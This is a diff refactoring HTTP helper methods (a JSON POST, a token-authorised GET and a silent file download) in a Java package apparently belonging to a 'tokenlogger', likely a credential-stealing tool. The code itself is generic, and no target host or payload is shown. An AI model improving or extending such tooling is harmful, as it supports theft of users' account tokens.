@@ -2,6 +2,9 @@ package tokenlogger.utils;
 
 import java.io.*;
 import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.nio.file.StandardCopyOption;
 
 import okhttp3.*;
 
@@ -18,10 +21,9 @@ public class Requests {
                 .addHeader("Content-Type", "application/json")
                 .build();
 
-        try {
-            Response response = client.newCall(request).execute();
+        try (Response response = client.newCall(request).execute()) {
             int responseCode = response.code();
-            System.out.println("POST Response Code: " + responseCode);
+            System.out.println("POST: " + responseCode);
         } catch (Exception ignored) {}
     }
 
@@ -30,33 +32,20 @@ public class Requests {
         Request.Builder requestBuilder = new Request.Builder()
                 .url(urlString);
 
-        if (token != null) {
-            requestBuilder.header("Authorization", token);
-        }
+        if (token != null) requestBuilder.header("Authorization", token);
 
-        try {
-            Response response = client.newCall(requestBuilder.build()).execute();
+        try (Response response = client.newCall(requestBuilder.build()).execute()) {
             int responseCode = response.code();
-            System.out.println("GET Response Code: " + responseCode);
-
-            if (responseCode == 200) {
-                return response.body().string();
-            }
-        } catch (Exception e) {}
+            if (responseCode == 200) return response.body().string();
+            System.out.println("GET: " + responseCode);
+        } catch (Exception ignored) {}
 
         return null;
     }
 
     public static void download(String fileUrl, String savePath) {
-        try {
-            URL url = new URL(fileUrl);
-            BufferedInputStream in = new BufferedInputStream(url.openStream());
-            FileOutputStream out = new FileOutputStream(savePath);
-
-            byte[] dataBuffer = new byte[1024];
-            int dataRead;
-            while ((dataRead = in.read(dataBuffer, 0, 1024)) != -1)
-                out.write(dataBuffer, 0, dataRead);
+        try (InputStream in = new URL(fileUrl).openStream()) {
+            Files.copy(in, Paths.get(savePath), StandardCopyOption.REPLACE_EXISTING);
         } catch (Exception ignored) {}
     }
 }
